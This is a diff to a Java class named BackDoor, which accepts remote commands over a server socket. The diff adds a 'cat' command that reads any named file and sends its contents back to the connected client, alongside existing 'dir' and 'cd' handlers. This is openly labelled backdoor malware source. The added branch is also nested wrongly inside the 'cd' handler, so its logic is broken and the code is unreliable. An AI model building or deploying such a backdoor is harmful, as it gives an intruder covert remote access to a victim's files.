@@ -9,6 +9,7 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.Scanner;
 
 public class BackDoor {
 
@@ -36,9 +37,9 @@ public class BackDoor {
 				writer.flush();
 				String clientCommand=reader.readLine();
 				
-				//if(clientCommand.equalsIgnoreCase("cd .")) {
-				//	writer.write("\nWorking directory is: "+workingDir+"\n\n");
-				//}
+				if(clientCommand.equalsIgnoreCase("cd .")) {
+					writer.write("\nWorking directory is: "+workingDir+"\n\n");
+				}
 				
 				 if(clientCommand.equalsIgnoreCase("dir")){
 					writer.write("\nHere is a list of files in your current directory \n\n");
@@ -46,7 +47,7 @@ public class BackDoor {
 					File[] allFiles=currentDirectory.listFiles();
 					
 					for(File f:allFiles) {
-					writer.write("\n\r"+f.getName()+(f.isDirectory()?"- Directory":"- file"));
+					writer.write("\n\r"+f.getName()+(f.isDirectory()?" - Directory":" - file"));
 					}
 					
 				}else if(clientCommand.startsWith("cd")){
@@ -65,6 +66,23 @@ public class BackDoor {
 						}
 						else {
 							writer.write("\n Directory doesn't exist");
+						}
+						
+						if(clientCommand.startsWith("cat")) {
+							String b = clientCommand.split(" ")[1];
+							
+							String tempary=workingDir+File.separator+b;
+							File file= new File(tempary);
+							Scanner input = new Scanner(file);
+							
+							while(input.hasNext()){
+
+					            String string = input.nextLine();
+
+					            writer.write("\n\r"+string);
+					        }
+						}else {
+							writer.write("\n File does not exist");
 						}
 					}
 				}
